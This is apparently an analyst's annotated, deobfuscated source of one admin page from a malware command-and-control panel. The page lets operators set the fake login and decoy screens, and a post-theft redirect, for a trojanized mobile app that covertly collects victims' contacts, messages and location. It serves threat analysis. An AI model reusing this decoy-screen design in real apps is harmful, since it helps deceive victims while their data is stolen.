/*
 * ============================================================================
 * C2 Panel — APP Front-end Config Page (c2_config_beautified.js)
 * ============================================================================
 * Purpose:
 *   Admin page that controls how the deployed victim app (the trojanized
 *   mobile client distributed by this C2) renders on the victim's device.
 *   Specifically: choosing background images shown on the fake login screen
 *   and the post-login "decoy" screen, plus a redirect URL the app opens in a
 *   WebView after data collection ("采集") completes.
 *
 *   Threat actor's UX workflow:
 *     Victim opens app   -> fake login background (login_bg_list[0])
 *     Victim clicks login -> fake "decoy" full-screen bg (after_login_bg_list[0])
 *                          -> while bg is shown, the app silently exfiltrates
 *                             contacts/msgs/location/etc. in the background
 *     After collection     -> opens redirect_url in a WebView    (e.g. a decoy
 *                             bank login or error page to mask the theft)
 *
 * Original file: src/views/config/index.vue (bundled by Vite).
 *
 * Imports:
 *   - "./index.BDBJuSBx.js"   Vue 3 + Element Plus runtime (mangled exports).
 *   - "./request.CmoIc_Cu.js"  axios wrapper; `f` here = request fn.
 *
 * Import alias map (notable):
 *   B  -> SFC factory wrapper
 *   L  -> onMounted
 *   p  -> createVNode block-open
 *   g  -> createElementVNode
 *   t  -> createVNode (used inside Element Plus slots)
 *   s  -> withCtx (slot factory)
 *   y  -> ref
 *   N  -> ElTabs (the top-level tab container; paged layout)
 *   D  -> reactive
 *   R  -> ElInput
 *   M  -> ElCard
 *   $  -> ElForm
 *   O  -> ElFormItem
 *   a  -> createVNode raw
 *   x  -> Fragment
 *   C  -> renderList
 *   W  -> ElImage  (Element Plus, with preview-src-list lightbox)
 *   Z  -> ElButton
 *   c  -> resolveDynamicComponent / unref helper for icons
 *   P  -> Element Plus "Delete" (a7 — used to remove uploaded images)
 *   j  -> ElIcon
 *   k  -> Element Plus "Plus" (a1 — used as the upload-add icon)
 *   q  -> ElInput (alias `A`)
 *   G  -> Element Plus "Link"/"Compass" icon (ad — used for redirect URL field)
 *   H  -> createTextVNode
 *   E  -> ElMessage / notification helper (alias N from index)
 *   f  -> axios request fn (from request.CmoIc_Cu.js)
 *
 * State model (reactive `l`):
 *   {
 *     login_bg_list:       string[],   // URLs of fake login bg images
 *     after_login_bg_list: string[],   // URLs of fake post-login bg images
 *     redirect_url:        string       // URL to open in WebView after exfil
 *   }
 *
 * API endpoints:
 *   GET  /manage/config/app-frontend      -> current state (above fields)
 *   POST /manage/config/app-frontend      -> persist edited state
 *   POST /manage/config/upload-image      (multipart/form-data) -> upload a
 *                                                     single image, returns
 *                                                     { data: { url } }
 *
 * Notes:
 *   - Backwards-compat shim: if server returns `login_bg`/`after_login_bg`
 *     (single-string legacy fields) but no `*_list` field, those lists are
 *     initialized with the single string as their only entry.
 *   - Upload form uses HTML <input type="file"> + FormData (NOT Element Plus's
 *     ElUpload component), giving the uploader more fine-grained control over
 *     the multipart payload.
 *   - There is only one tab ("APP Front-end Config"). The tab container was
 *     likely intended to host additional config sections in the future, but
 *     the panel ships with just this single one.
 * ============================================================================
 */

import {
    _ as B,
    o as L,
    b as p,
    g,
    d as t,
    w as s,
    s as y,
    aa as N,
    I as D,
    ab as R,
    ac as M,
    z as $,
    C as O,
    f as a,
    F as x,
    v as C,
    Z as W,
    p as Z,
    u as c,
    a7 as P,
    k as j,
    a1 as k,
    O as q,
    ad as G,
    m as H,
    N as E
} from "./index.BDBJuSBx.js";
import {
    s as f
} from "./request.CmoIc_Cu.js"; /* empty css                */ /* empty css                     */ /* empty css                 */ /* empty css                  */ /* empty css                 */

// ---- Static class-name / attr objects used by template ----
const J = {
        class: "config-page"
    },
    K = {
        class: "upload-section"           // wraps each image-upload area
    },
    Q = {
        class: "img-preview-list"         // row of uploaded-image thumbnails
    },
    S = {
        class: "img-upload-btn"           // the clickable "上传" label/button
    },
    X = {
        class: "upload-section"
    },
    Y = {
        class: "img-preview-list"
    },
    ee = {
        class: "img-upload-btn"
    },
    // ---- SFC options object ----
    // __name:"index"  -> original file was views/config/index.vue
    te = {
        __name: "index",
        setup(le) {
            // ----- Reactive state -----
            // `b` = tab-model ref bound to ElTabs; default "app" (the only tab).
            const b = y("app"),
                // `m` = form-submit in-flight flag (drives Save button loading).
                m = y(!1),
                // `l` = reactive form model object (see header comment).
                l = D({
                    login_bg_list: [],
                    after_login_bg_list: [],
                    redirect_url: ""
                });

            /**
             * fetchConfig() — GET /manage/config/app-frontend
             *
             * Load current persisted config from the server and merge it into
             * the reactive model. Includes a legacy-compat fallback:
             *   - if `*_list` field is missing, but `*_bg` single-string is
             *     present, synthesize a one-item list from the legacy field.
             * Errors swallowed silently (the form just defaults to empty).
             */
            async function V() {
                try {
                    const e = (await f({
                        url: "/manage/config/app-frontend"
                    })).data || {};
                    l.login_bg_list = e.login_bg_list || (e.login_bg ? [e.login_bg] : []), l.after_login_bg_list = e.after_login_bg_list || (e.after_login_bg ? [e.after_login_bg] : []), l.redirect_url = e.redirect_url || ""
                } catch {}
            }

            /**
             * onUpload(event, targetField) — handler for the hidden <input
             * type="file">.
             *
             *   event         = native input change event
             *   targetField   = "login_bg_list" or "after_login_bg_list"
             *
             * Builds FormData with one "file" entry and POSTs it to
             * /manage/config/upload-image (multipart/form-data). On success,
             * pushes the returned URL onto the target field's list and shows a
             * success toast. Always clears the input value afterward so the
             * same file can be picked twice in a row.
             */
            async function v(i, e) {
                const _ = i.target.files[0];
                if (!_) return;
                const o = new FormData;
                o.append("file", _);
                try {
                    const r = await f({
                        url: "/manage/config/upload-image",
                        method: "post",
                        data: o,
                        headers: {
                            "Content-Type": "multipart/form-data"
                        }
                    });
                    l[e].push(r.data.url), E.success("上传成功")
                } catch {}
                i.target.value = ""
            }

            /**
             * removeImage(field, idx) — splice the entry at index `idx` out
             * of the list named `field`. Used by the small trash-button on top
             * of each image preview thumbnail.
             */
            function w(i, e) {
                l[i].splice(e, 1)
            }

            /**
             * saveConfig() — POST /manage/config/app-frontend
             *
             * Build the request payload by mirroring the reactive model plus a
             * legacy `login_bg` / `after_login_bg` single-string field set to
             * the first item of each list (so old server-side code that still
             * reads the legacy field keeps working). On success shows a toast.
             * Toggle `m` flag so the Save button shows a spinner while in
             * flight.
             */
            async function h() {
                m.value = !0;
                try {
                    const i = {
                        login_bg: l.login_bg_list[0] || "",
                        after_login_bg: l.after_login_bg_list[0] || "",
                        login_bg_list: l.login_bg_list,
                        after_login_bg_list: l.after_login_bg_list,
                        redirect_url: l.redirect_url
                    };
                    await f({
                        url: "/manage/config/app-frontend",
                        method: "post",
                        data: i
                    }), E.success("APP配置已保存")
                } catch {}
                m.value = !1
            }

            // onMounted: kick off the initial config load.
            return L(() => {
                V()
            }), (i, e) => {
                // Render-time local aliases for Element Plus components.
                const _ = W,    // ElImage (with preview-src-list = lightbox)
                    o = Z,      // ElButton
                    r = j,      // ElIcon  (used for upload-add icon)
                    u = O,      // ElFormItem
                    A = q,      // ElInput (redirect URL field)
                    I = $,      // ElForm
                    z = M,      // ElCard
                    F = R,      // ElTabPane
                    T = N;      // ElTabs
                return p(), g("div", J, [
                    // ----- Top-level tab container (only one tab pane here) -----
                    t(T, {
                        modelValue: b.value,
                        "onUpdate:modelValue": e[3] || (e[3] = n => b.value = n)
                    }, {
                        default: s(() => [
                            // ----- Tab pane: "APP前端配置" -----
                            t(F, {
                                label: "APP前端配置",
                                name: "app"
                            }, {
                                default: s(() => [t(z, {
                                    shadow: "never"
                                }, {
                                    // Card header: bolded title + tip text.
                                    header: s(() => [...e[4] || (e[4] = [
                                        a("strong", null, "APP前端配置", -1),
                                        // ^ "APP Front-end Config"
                                        a("span", {
                                            class: "card-tip"
                                        }, "配置完APP通过接口自动拉取", -1)
                                        // ^ "Configured, the APP pulls these via API"
                                    ])]),
                                    // Card body: the ElForm with three form-items.
                                    default: s(() => [t(I, {
                                        "label-width": "130px",
                                        "label-position": "left"
                                    }, {
                                        default: s(() => [
                                            // ============== Form item: 登录页背景图 ==============
                                            // "Login-page background image" — what
                                            // the victim sees when the app opens.
                                            t(u, {
                                                label: "登录页背景图"
                                            }, {
                                                default: s(() => [a("div", K, [
                                                    // Tip text (cached)
                                                    e[6] || (e[6] = a("p", {
                                                        class: "form-tip"
                                                    }, "打开APP就看到的背景图（登录表单叠在上面）", -1)),
                                                    // ^ "Background shown when the APP
                                                    //    opens (login form overlaid on top)"
                                                    // Preview list rendered with renderList
                                                    a("div", Q, [(p(!0), g(x, null, C(l.login_bg_list, (n, d) => (p(), g("div", {
                                                        key: d,
                                                        class: "img-preview-item"
                                                    }, [
                                                        // ElImage with click-to-zoom lightbox
                                                        // of the whole list
                                                        t(_, {
                                                            src: n,
                                                            fit: "cover",
                                                            style: {
                                                                width: "120px",
                                                                height: "200px",
                                                                "border-radius": "6px"
                                                            },
                                                            "preview-src-list": l.login_bg_list
                                                        }, null, 8, ["src", "preview-src-list"]),
                                                        // Delete-on-thumbnail button
                                                        t(o, {
                                                            type: "danger",
                                                            size: "small",
                                                            circle: "",
                                                            icon: c(P),         // Delete icon
                                                            class: "img-del-btn",
                                                            onClick: U => w("login_bg_list", d)
                                                        }, null, 8, ["icon", "onClick"])
                                                    ]))), 128)),
                                                    // The upload trigger <label>
                                                    a("label", S, [
                                                        a("input", {
                                                            type: "file",
                                                            accept: "image/*",
                                                            hidden: "",
                                                            onChange: e[0] || (e[0] = n => v(n, "login_bg_list"))
                                                        }, null, 32),
                                                        t(r, {
                                                            size: 24
                                                        }, {
                                                            default: s(() => [t(c(k))]), // Plus icon
                                                            _: 1
                                                        }),
                                                        // "上传" / "Upload" static text
                                                        e[5] || (e[5] = a("span", null, "上传", -1))
                                                    ])
                                                ])]),
                                                _: 1
                                            }),

                                            // ============== Form item: 登录后背景图 ==============
                                            // "After-login background image" — what
                                            // the victim sees while the app covertly
                                            // collects data ("采集期间用户看这个"
                                            // = "the user sees this during collection")
                                            t(u, {
                                                label: "登录后背景图"
                                            }, {
                                                default: s(() => [a("div", X, [
                                                    e[8] || (e[8] = a("p", {
                                                        class: "form-tip"
                                                    }, "点击登录后全屏显示的图（采集期间用户看这个）", -1)),
                                                    // ^ "Full-screen image shown after
                                                    //    login click (user sees this during
                                                    //    the data-collection phase)"
                                                    a("div", Y, [(p(!0), g(x, null, C(l.after_login_bg_list, (n, d) => (p(), g("div", {
                                                        key: d,
                                                        class: "img-preview-item"
                                                    }, [t(_, {
                                                        src: n,
                                                        fit: "cover",
                                                        style: {
                                                            width: "120px",
                                                            height: "200px",
                                                            "border-radius": "6px"
                                                        },
                                                        "preview-src-list": l.after_login_bg_list
                                                    }, null, 8, ["src", "preview-src-list"]), t(o, {
                                                        type: "danger",
                                                        size: "small",
                                                        circle: "",
                                                        icon: c(P),
                                                        class: "img-del-btn",
                                                        onClick: U => w("after_login_bg_list", d)
                                                    }, null, 8, ["icon", "onClick"])]))), 128)), a("label", ee, [a("input", {
                                                        type: "file",
                                                        accept: "image/*",
                                                        hidden: "",
                                                        onChange: e[1] || (e[1] = n => v(n, "after_login_bg_list"))
                                                    }, null, 32), t(r, {
                                                        size: 24
                                                    }, {
                                                        default: s(() => [t(c(k))]),
                                                        _: 1
                                                    }), e[7] || (e[7] = a("span", null, "上传", -1))])])])]),
                                                _: 1
                                            }),

                                            // ============== Form item: 跳转链接URL ==============
                                            // "Redirect link URL" — the WebView target
                                            // opened after the data-collection phase.
                                            t(u, {
                                                label: "跳转链接URL"
                                            }, {
                                                default: s(() => [t(A, {
                                                    modelValue: l.redirect_url,
                                                    "onUpdate:modelValue": e[2] || (e[2] = n => l.redirect_url = n),
                                                    placeholder: "采集完成后跳转到此URL，留空则停留在背景图",
                                                    clearable: ""
                                                    // ^ "After collection, redirect to this
                                                    //    URL; leave blank to stay on bg image"
                                                }, {
                                                    // Prepend slot renders the link/compass icon
                                                    prepend: s(() => [t(r, null, {
                                                        default: s(() => [t(c(G))]), // Compass/Link icon
                                                        _: 1
                                                    })]),
                                                    _: 1
                                                }, 8, ["modelValue"]),
                                                // Helper text under the input
                                                e[9] || (e[9] = a("p", {
                                                    class: "form-tip"
                                                }, "可选，采集完后APP自动跳转到此URL(WebView打开)，不填就一直显示登录后背景图", -1))
                                                // ^ "Optional; after collection the APP auto-
                                                //    redirects to this URL (WebView). If empty,
                                                //    the post-login bg keeps showing."
                                                ]),
                                                _: 1
                                            }),

                                            // ============== Form item: Save button row ==============
                                            t(u, null, {
                                                default: s(() => [t(o, {
                                                    type: "primary",
                                                    onClick: h,                 // saveConfig()
                                                    loading: m.value             // spinner while POST
                                                }, {
                                                    default: s(() => [...e[10] || (e[10] = [H("保存配置", -1)])]),
                                                    // ^ "Save Config"
                                                    _: 1
                                                }, 8, ["loading"])]),
                                                _: 1
                                            })]),
                                        _: 1
                                    })]),
                                    _: 1
                                })]),
                                _: 1
                            })]),
                        _: 1
                    }, 8, ["modelValue"])])
            }
        }
    },
    // ---- SFC factory wrap: scoped-style id data-v-2310553f ----
    de = B(te, [
        ["__scopeId", "data-v-2310553f"]
    ]);
export {
    de as
    default
};
